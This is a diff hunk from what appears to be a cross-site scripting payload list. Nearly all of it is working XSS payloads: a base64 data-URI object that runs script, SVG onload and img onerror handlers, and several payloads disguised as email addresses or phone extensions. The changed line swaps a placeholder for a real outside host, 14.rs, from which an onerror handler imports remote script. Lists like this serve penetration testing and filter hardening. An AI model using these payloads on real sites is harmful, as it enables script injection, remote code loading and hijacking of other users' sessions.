@@ -2,7 +2,7 @@
 <object data=`data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=`></object>
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 "><img/src/onerror=import('//14.rs/')>"@14.rs
-"><img/src/onerror=import('//domain/')>"@yourdomain
+"><img/src/onerror=import('//14.rs/')>"@14.rs
 013371337;ext=<img/src/onerror=import('//domain/')>
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <Svg/OnLoad=alert(1337)>"@gmail.com
